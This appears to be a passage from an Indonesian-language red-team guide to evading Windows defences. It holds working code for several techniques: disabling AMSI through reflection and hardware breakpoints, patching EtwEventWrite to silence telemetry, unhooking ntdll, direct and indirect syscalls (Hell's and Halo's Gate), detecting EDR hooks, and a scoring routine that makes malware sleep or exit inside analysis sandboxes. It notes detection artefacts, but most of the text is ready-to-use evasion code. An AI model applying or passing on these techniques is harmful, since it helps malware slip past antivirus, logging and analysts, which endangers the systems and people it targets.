Field `amsiContext` di `System.Management.Automation.AmsiUtils` (statik) berisi pointer ke internal AMSI context. Bila null / invalid, `AmsiScanBuffer` mengembalikan `E_INVALIDARG` sebelum scan.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').
  GetField('amsiContext','NonPublic,Static').
  SetValue($null,[IntPtr]::Zero)
```
**Variabel:** `amsiSession` dan `amsiInitFailed` adalah field sekunder yang juga di-null. Build PowerShell 5.1 (Win11 24H2, PS 5.1.22621.4391) masih rentan; PowerShell 7.3.10 posting `amsiContext` menjadi `SafeAmsiContextHandle` — `.SetValue` butuh bypass reflective field access (`BindingFlags` override) atau `RuntimeHelpers.GetUninitializedObject`.

**Artefak:** Reflection `GetType/GetField/SetValue` lewat `System.Management.Automation` di profil ETW `.NET Runtime` provider `Microsoft-Windows-DotNETRuntime` (`MethodLoadVerbose`). EDR PowerShell script block logging (Event 4104) tetap log ScriptBlock kecuali `ScriptBlockLogging` dimatikan di registry (perlu admin).

### 1.4 Hardware breakpoint — `Dr0` + VEH

Tanpa mengubah memory. Set `Dr0 = &AmsiScanBuffer`, register `Dr7` dengan L0=1, RW0=0 (execute), LEN0=00. Ketika host memanggil `AmsiScanBuffer`, CPU raise `EXCEPTION_SINGLE_STEP` (#DB, 0x80000004). Handler VEH memeriksa `RIP == Dr0` → set `RAX = 0x80070057`, `RIP += N` (lewati prolog), `EXCEPTION_CONTINUE_EXECUTION`.

```c
// pseudo (C, ring3)
CONTEXT ctx; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(hThread, &ctx);
ctx.Dr0 = (DWORD64)pAmsiScanBuffer;
ctx.Dr7 = (ctx.Dr7 & ~0xF) | 0x1; // enable L0, exec
SetThreadContext(hThread, &ctx);

// VEH handler
LONG CALLBACK Veh(PEXCEPTION_POINTERS p) {
  if (p->ExceptionRecord->ExceptionCode == 0x80000004 &&
      p->ContextRecord->Rip == (DWORD64)pAmsiScanBuffer) {
    p->ContextRecord->Rax = 0x80070057;
    p->ContextRecord->Rip += <prolog_len>; // skip
    return EXCEPTION_CONTINUE_EXECUTION;
  }
  return EXCEPTION_CONTINUE_SEARCH;
}
```
Per-thread: bila PowerShell menggunakan thread pool, breakpoint di thread yang menjalankan script (biasanya main thread + beberapa worker). Alternatif: attach ke semua thread via `Thread32First/Next`. Runtime `.NET` melakukan `SuspendThread` untuk GC — thread yang di-suspend di tengah `AmsiScanBuffer` akan memicu #DB, tidak masalah bila handler aman.

**Artefak:** `GetThreadContext`/`SetThreadContext`/`AddVectoredExceptionHandler` — semua userland, tetapi `SetThreadContext` pada `Dr0` di-flag EDR tertentu (Microsoft Defender "Tamper protection" 4.18+ heuristik `HWBP`). Tidak ada memory write ke image.

**Kenapa gagal:** Debug register hanya 4 (Dr0-D3). Bila host atau .NET runtime sudah memakai HWBP (diagnostik, debugging), Dr0 bentrok. Handler harus mengecek `Dr6` untuk `B0` flag dan clear. Bila tidak, exception berulang → hang.

### 1.5 AMSI bypass berbasis `AmsiScanString` + `AmsiInitialize` hook IAT

Hook `AmsiScanBuffer` di IAT host (`System.Management.Automation.dll!AmsiScanBuffer` IAT entry) → detour ke stub yang return 0. Efektif di host yang tidak punya image-load callback. Dikalahkan oleh Import Table redirection detection EDR.

| Teknik | Target | Artefak EDR | Efektif 2024-2025 |
|---|---|---|---|
| Memory patch 6 byte | amsi.dll `.text` | VirtualProtect + WriteProcessMemory self | PS 5.1 ya; PS 7.4+ tidak |
| Reflection null | field .NET | Reflection telemetry | PS 5.1 build lama ya |
| HWBP + VEH | thread ctx | SetThreadContext | tergantung EDR |
| IAT hook | host IAT | IAT discrepancy | sebagian besar tidak |

---

## 2. ETW Patching

### 2.1 Mekanisme
`EtwEventWrite` di `ntdll!EtwEventWrite` (userland) memanggil `NtTraceEvent` → `EtwpLogApiCalls` kernelless. Banyak provider penting untuk red team:
- `Microsoft-Windows-DotNETRuntime` (assembly load, JIT, method invoke)
- `Microsoft-Windows-PowerShell` (script block, module logging)
- `Microsoft-Windows-Threat-Intelligence` (TI, hanya admin/PPL)
- `Microsoft-Windows-Kernel-Process` (process create, image load — lewat `EtwTi`)
- `Microsoft-Antimalware-Scan-Interface`

Patch `EtwEventWrite` → `ret 0` (x64: `C3` atau `B8 00 00 00 00 C3`). Semua provider userland kehilangan telemetry. Kernel ETW (process creation, image load lewat `EtwTi`) tetap jalan — butuh patch terpisah atau driver.

```c
// C
HMODULE h = GetModuleHandleA("ntdll.dll");
void* p = GetProcAddress(h, "EtwEventWrite");
DWORD old;
VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &old);
*(BYTE*)p = 0xC3; // ret
VirtualProtect(p, 1, old, &old);
```

PowerShell inline (byte-patch via `Marshal`): sama seperti AMSI, ganti offset dan shellcode `0xC3`.

**Artefak:** `GetProcAddress("EtwEventWrite")`, `VirtualProtect` image `.text` (ntdll). Microsoft Defender for Endpoint sensor `Behavior:Win32/EtW.Bypass` (MDE 2023+) menandai bila dibuat dari image non-Microsoft — heuristic pada `.text` diff post-load.

**Gagal:** `EtwEventWriteFull` (RtlpTraceCritical) tetap memanggil `EtwEventWrite` versi kernel-adjacent. Sebagian telemetry (mis. CIS `MpSvc` provider) memakai `EtwEventWriteEx` → patch `EtwEventWriteEx` juga. Windows 11 24H2 build 26100 memakai `NtTraceEvent` langsung dari .NET 8 runtime untuk sebagian provider — patch userland ETW saja tidak mematikan.

### 2.2 Patch `ntdll!EtwEventWrite` via `NtProtectVirtualMemory` (direct syscall)

Menghindari userland hook `VirtualProtect`:
```asm
; x64 direct syscall NtProtectVirtualMemory (SSN 0x50 pada Win11 22H2 22621.xxxx, cek per build)
mov r10, rcx
mov eax, 0x50
syscall
ret
```
Setelah proteksi, tulis `C3`. SSN berubah per build (Windows 10 19045: `NtProtectVirtualMemory` = 0x50; Win11 22621 = 0x50; Win11 26100 = 0x50 — cek dengan `SysWhispers` atau hook-detection scanner). Tidak stabil antar patch KB.

**Artefak:** syscall langsung dari image non-ntdll → MDE sensor syscall (kernel callbacks `PsSetCreateProcessNotifyRoutineEx` tidak cover, tetapi `Microsoft-Windows-Threat-Intelligence` mencatat `NtProtectVirtualMemory` dengan `CallStack` mismatch). `Hell's Gate` calculator juga meninggalkan pola `halosgate` string di binary.

---

## 3. Unhooking ntdll

### 3.1 Permasalahan
EDR userland hook memasang detour 5-byte `E9 xx xx xx xx` (jmp rel32) atau `FF 25` (jmp qword) di awal fungsi ntdll `Nt*`/`Zw*`. Setelah unhook, syscall langsung eksekusi stub asli → SSN benar → kernel `Nt*` dipanggil tanpa visible hook.

### 3.2 Fresh copy dari KnownDlls / disk

`KnownDlls` object directory `\KnownDlls\ntdll.dll` adalah section yang dimap ke setiap proses. Kita buka section, map ke address baru, overwrite `.text` ntdll yang sudah di-hook.

```c
// 1. buka \KnownDlls\ntdll.dll via NtOpenSection
UNICODE_STRING p; RtlInitUnicodeString(&p, L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES oa = { .Length=sizeof(oa), .ObjectName=&p, .Attributes=OBJ_CASE_INSENSITIVE };
HANDLE h; NtOpenSection(&h, SECTION_MAP_READ, &oa);

// 2. map view
SIZE_T sz = 0; PVOID base = NULL;
NtMapViewOfSection(h, NtCurrentProcess(), &base, 0, 0, NULL, &sz, ViewShare, 0, PAGE_READONLY);

// 3. overwrite ntdll .text pada address space proses
// base = fresh ntdll image
// GetModuleHandle("ntdll") = current
PIMAGE_DOS_HEADER dos = ...;
PIMAGE_NT_HEADERS nt = ...;
PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
for each section " .text ":
  memcpy(current_base + s->VirtualAddress, fresh_base + s->VirtualAddress, s->Misc.VirtualSize);
```

Fresh copy **tidak menyentuh** header/relokasi — hanya overwrite `.text`, jadi EDR yang memantau image load tidak trigger (tidak ada new image). **Artefak:** `NtOpenSection` / `NtMapViewOfSection` pada KnownDlls dengan destination new base, memcpy lintas image.

**Variasi disk:** baca `C:\Windows\System32\ntdll.dll` → `CreateFile` + `ReadFile` + `memcpy` ke `.text`. Artefak: file read ntdll.dll oleh proses non-system (high signal).

**Gagal:** EDR modern (CrowdStrike Falcon 7.10+, MDE 2023+) melakukan integrity check periodik pada `.text` ntdll untuk fungsi yang di-hook — direktori `.text` yang berubah dari image awal = alert. Menghapus semua hook juga menghapus deteksi EDR pada proses itu sendiri, tetapi objective check pasca-unhooking tetap jalan. Untuk EDR yang tidak cek, unhook efektif sampai reboot/proses restart.

Perbaikan: gunakan **per-function** fresh copy (hanya copy 16 byte awal fungsi target, mis. `NtCreateThreadEx`, `NtOpenProcess`), sehingga diff `.text` global tidak match.

### 3.3 Direct syscall (Hell's Gate)

Tanpa ntdll. Ambil SSN dari ntdll apa adanya (bila tidak di-hook) atau dari urutan stub:

```
; Hell's Gate, x64
; asumsi RCX = arg1, RDX = arg2, R8 = arg3, R9 = arg4
; ambil syscall number dari ntdll!Nt* (4 byte setelah prolog)
mov r10, rcx
mov eax, <SSN>
syscall
ret
```
Hell's Gate presisi SSN:
1. `GetProcAddress("NtCreateFile")` → pointer ke stub.
2. Cek `stub[0..3] == 4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`). Bila match, SSN = `*(DWORD*)(stub+4)`.
3. Bila tidak, gunakan fallback Halo's Gate.

**Artefak:** bila semua stub di-hook, Hell's Gate gagal (semua ntdll hook E9 → 5 byte awal bukan prolog). Juga, syscall dari alamat non-ntdll di-flag sensor MDE (kernel ETW-TI `CallStack` dari image private).

### 3.4 Halo's Gate — fallback saat stub di-hook

Bila `NtXxx` di-hook (`E9` atau `FF 25`), cari tetangga `NtYyy` di atas/bawah yang belum di-hook, hitung SSN relatif: `SSN(NtXxx) = SSN(NtYyy) ± distance`. Jarak ditentukan dengan scan `syscall` pattern dan counter ordinal.

```
for (i = 1; i < 500; i++) {
  stub_up   = current_fn + i * STUB_SIZE;   // 32 byte
  stub_down = current_fn - i * STUB_SIZE;
  if (is_clean(stub_up))   return get_ssn(stub_up)   + i;
  if (is_clean(stub_down)) return get_ssn(stub_down) - i;
}
```

**Fragile:** STUB_SIZE bergantung kompiler/build. Win10 19045 = 32 byte, Win11 22621 = 32 byte, Win11 26100 = 32 byte — konsisten, tetapi preamble hook `E9` mengganti byte `4C 8B D1 B8` sehingga `is_clean` bisa false positive jika hook hanya 5 byte. Halo's Gate menemukan neighbor yang `E9`-nya juga tidak terdeteksi. Hasil SSN bisa salah → BSOD atau return `STATUS_INVALID_SYSTEM_SERVICE`.

### 3.5 Tartarus Gate / FreshyCalls / SysWhispers3

- **Tartarus Gate**: varian Halo's Gate dengan validasi `syscall; ret` sebagai terminator stub dan `jmp [rip+...]` sebagai indikator hook. Lebih toleran terhadap hook parsial.
- **FreshyCalls**: sort semua `Nt*` stub berdasarkan alamat, SSN = index dalam urutan alamat (karena ntdll arrange stub by SSN). Tidak butuh pattern matching stub. Rentan bila build mengubah ordering.
- **SysWhispers3**: generator — `--jump` (jmp ke `syscall` gadget di ntdll, tidak memanggil `syscall` dari image private), `--egg` (encode syscall number). Memitigasi deteksi "syscall dari image private" dengan `jmp` ke gadget `syscall;ret` di ntdll (`KiFastSystemCallRet` region atau `Nt*` stub+offset).

```c
// SysWhispers3 --jump contoh
extern "C" NTSTATUS Sw3NtCreateFile(...) {
  // jmp ke ntdll!NtCreateFile+<offset syscall>
  return ((NTSTATUS(*)(...))pSyscallGadget)(...);
}
```

**Artefak:** `jmp` ke region ntdll `.text` yang bukan entrypoint — bila EDR melakukan return-address validation, `RIP` saat `syscall` berada di `.text` ntdll (terlihat normal), tetapi call stack sebelum `jmp` dari image private. MDE 2024 menambahkan "Syscall from private memory" heuristic yang melihat `RIP` region, bukan `RSP`.

### 3.6 Indirect syscall

Sama seperti direct, tetapi instruksi `syscall` ada di ntdll (atau `win32u.dll`), bukan di image attacker. Alur:
1. Set `rax = SSN`, `rcx = arg1`, dst.
2. `jmp` ke gadget `syscall; ret` di ntdll.
3. Return kembali ke caller.

Artefak `rip` saat `syscall` = dalam ntdll. Kernel `PsGetCurrentProcess` + ETW-TI callstack parser melihat frame ntdll + image private caller. Tidak mematikan deteksi, hanya mengurangi heuristik naive "syscall instruction outside ntdll".

### 3.7 Tabel perbandingan

| Teknik | Source SSN | syscall location | Deteksi utama | Stabilitas build |
|---|---|---|---|---|
| Hell's Gate | stub ntdll (clean) | image private | syscall private | tinggi, gagal bila semua stub hooked |
| Halo's Gate | neighbor stub | image private | sama + SSN mismatch | sedang |
| Tartarus Gate | neighbor + validasi `syscall` | image private | sama | sedang |
| FreshyCalls | sort alamat | image private | order mismatch | rendah antar build besar |
| SysWhispers3 `--jump` | embedded | ntdll gadget | return-frame mismatch | tinggi |
| Direct syscall handmade | embedded | image private | image private syscall | tinggi |
| Indirect syscall | embedded + gadget ntdll | ntdll | return addr validation | tinggi |

**Angka build Windows 11 24H2 (26100.2314):** `NtCreateFile` SSN = 0x55, `NtProtectVirtualMemory` = 0x50, `NtAllocateVirtualMemory` = 0x18. Verifikasi via `NtApiDotNet` atau `Syscall table` dari `j00ru` untuk build spesifik — jangan hard-code lintas build.

## 4. EDR Userland Hook Detection

Untuk menghindari hook, deteksi dulu:

### 4.1 Cek byte pertama setiap `Nt*`

```c
HMODULE h = GetModuleHandleA("ntdll.dll");
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)h;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)h + dos->e_lfanew);
PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)h + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
DWORD* names = (DWORD*)((BYTE*)h + exp->AddressOfNames);
for (DWORD i = 0; i < exp->NumberOfNames; i++) {
  char* name = (char*)h + names[i];
  if (name[0]!='N'||name[1]!='t') continue;
  void* fn = GetProcAddress(h, name);
  BYTE b = *(BYTE*)fn;
  if (b == 0xE9 || b == 0xFF) printf("HOOKED %s\n", name);
}
```
Hook standar EDR: `E9 <rel32>` (Detours) atau `FF 25 00 00 00 00` (jmp [rip+0]) atau `48 FF 25` (jmp qword). Hook `mov rax, imm64; jmp rax` = `48 B8 ... FF E0` juga sering.

### 4.2 Cek IAT host

Untuk userland EDR hook yang dipasang via IAT (`Import Directory`), bandingkan alamat di IAT dengan `GetProcAddress` asli + `LoadLibrary` fresh. Bila beda → ter-hook.

### 4.3 Cek `ntdll` diff via KnownDlls

Bandingkan `.text` `.data` fresh ntdll vs current ntdll. Diff non-zero pada prolog fungsi = hook.

### 4.4 Cek `syscall` stub integrity

Di `NtXxx` yang di-hook, prolog `4C 8B D1 B8` hilang. Bila deteksi hook dan ambil SSN dari KnownDlls / disk, lakukan unhook atau direct syscall.

**Angka konkret:** CrowdStrike Falcon 7.16 hook `NtCreateThreadEx`, `NtAllocateVirtualMemory`, `NtProtectVirtualMemory`, `NtWriteVirtualMemory`, `NtOpenProcess`, `NtMapViewOfSection`. SentinelOne Singularity hook ~160 fungsi. Microsoft Defender for Endpoint hook ~40 fungsi pada `ntdll` + `kernelbase.dll` + `kernel32.dll` + `amsi.dll`. Cortex XDR hook via `.text` di `ntdll` saja (~90 fungsi).

## 5. Sandbox Evasion

### 5.1 Sleep acceleration

Sandbox biasanya mempercepat `Sleep` untuk mempercepat eksekusi sample. Bila sample tidur 10 menit, sandbox memanggil `NtDelayExecution` / `Sleep` dengan timeout yang dikurangi (rapid returning).

Deteksi: ukur wall clock vs `QueryPerformanceCounter`.

```c
LARGE_INTEGER t1,t2,f;
QueryPerformanceFrequency(&f); QueryPerformanceCounter(&t1);
Sleep(60000); // 60 detik nominal
QueryPerformanceCounter(&t2);
double real = (double)(t2.QuadPart - t1.QuadPart) / f.QuadPart;
if (real < 55.0) { /* sandbox / accelerated sleep */ exit(0); }
```

**Kenapa gagal:** sebagian sandbox (Cuckoo3, CAPE v2) sekarang benar-benar menunggu atau menggunakan `NtDelayExecution` dengan HighResolution timer yang tidak dipalsukan. Deteksi juga bisa false positive di VM dengan TSC tidak stabil / host overload → `real > 70`. Gunakan multiple sample + median. Bila sandbox menyuntikkan `Sleep` melalui hook userland `Sleep` (mengabaikan argumen), `QueryPerformanceCounter` tetap benar (kernel), jadi aman untuk deteksi hook-based accelerator. Bila sandbox menggunakan `NtDelayExecution` hook userland dan tidak mengubah QPC, deteksi tetap akurat.

### 5.2 User interaction / mouse movement

```c
LASTINPUTINFO li = { sizeof(li) };
GetLastInputInfo(&li);
DWORD idle_ms = GetTickCount() - li.dwTime;
if (idle_ms < 30000) { /* ada interaksi → kemungkinan user nyata → perilaku normal */ }
else { /* idle → sandbox / analyst tidak di depan */ }
```
`GetLastInputInfo` mengembalikan `dwTime` untuk input di session desktop tempat proses berjalan. Sandbox headless (Session 0) mengembalikan 0. Sandbox dengan input simulator (CAPE `human.py`, Joe Sandbox simulated mouse) mengembalikan interaksi terus-menerus — bisa dianggap user nyata.

**Gagal:** proses Windows Service (Session 0) tidak menerima input, `GetLastInputInfo` 0 → sering dianggap sandbox. Sample harus membedakan Session 0 vs Session 1 vs 2: cek `ProcessIdToSessionId` dan `WTSQuerySessionInformation(WTSActive)`. Juga `GetCursorPos` di session non-interaktif return `(0,0)`.

### 5.3 Hardware fingerprint

Sandbox VM punya ciri BIOS/OEM yang khas. Kumpulkan dan bandingkan:

```c
// WMI / registry
HKEY k; RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", ...);
RegQueryValueExA(..., "SystemManufacturer", ...);  // "VMware, Inc." / "QEMU" / "Xen" / "innotek GmbH" / "Microsoft Corporation" (Hyper-V)
RegQueryValueExA(..., "SystemProductName", ...);   // "VMware7,1" / "Standard PC" / "VirtualBox"

// CPU
SYSTEM_INFO si; GetSystemInfo(&si);
si.dwNumberOfProcessors; // sandbox umumnya 1-2, VM default 1
// RAM
GlobalMemoryStatusEx(&ms); ms.ullTotalPhys;
```

Ciri deteksi:
- CPU count < 2, RAM < 2 GB → sandbox default
- `SystemManufacturer` ∈ {VMware, QEMU, Xen, VirtualBox, innotek, Amazon EC2}
- `SystemProductName` ∈ {VirtualBox, VMware Virtual Platform, KVM, Standard PC}
- Disk size < 60 GB, single partition
- Tidak ada battery (laptop) → `GetSystemPowerStatus` `BatteryFlag == 128` (no battery) + AC
- Username ∈ {sandbox, malware, analyst, user, John, test, vm, cuckoo, current}
- Hostname ∈ {SANDBOX, MALWARE, VIRUS, CUCKOO, JOE, ANALYSIS}
- MAC OUI ∈ VMware `00:0C:29`, `00:50:56`, `00:05:69`; VirtualBox `08:00:27`; QEMU `52:54:00`; Xen `00:16:3E`; Hyper-V `00:15:5D`
- Uptime < 15 menit (`GetTickCount64`)

Pipeline deteksi umum: AND-based, yaitu butuh ≥ 3 indikator untuk concluding sandbox — menghindari false positive pada VM production (banyak CI/VM sah).

**Angka sandbox default 2024:**
| Platform | CPU | RAM | Disk | Hostname | Username | MAC |
|---|---|---|---|---|---|---|
| CAPEv2 | 1-2 | 2 GB | 40-60 GB | CAPE / cuckoo | cape / user | 52:54:00 / 08:00:27 |
| Joe Sandbox 38 | 2 | 4 GB | 80 GB | JOESANDBOX | joe | 00:50:56 |
| Any.run | 2 | 4 GB | 100 GB | (acak) | admin | 00:50:56 |
| Hybrid Analysis (CrowdStrike) | 2 | 4 GB | 100 GB | (acak) | analysis | 00:50:56 |

Platform modern (Any.run paid tier, Hybrid Analysis) memilih `< 2` indikator karena randomization — deteksi VM berbasis bio/registry saja gagal. Gunakan kombinasi: uptime, hardware, dan **timing** (mis. QPC di hypervisor tidak akurat pada TSC sync).

### 5.4 Nested / environment check kombinasi (contoh)

```c
int score = 0;
if (cpu_count < 2) score++;
if (total_ram_gb < 4) score++;
if (battery == 128 && !has_ac) score++;
if (mac_oui_match(vm_oui_list)) score++;
if (idle_ms > 5*60*1000 && GetLastInputInfo_ok) score++;
if (uptime_ms < 15*60*1000) score++;
if (SystemManufacturer_contains("VMware|QEMU|Xen|VirtualBox|Microsoft")) score++;
if (username_in_list) score++;
if (hostname_in_list) score++;
if (score >= 3) sleep_long_or_exit();
```
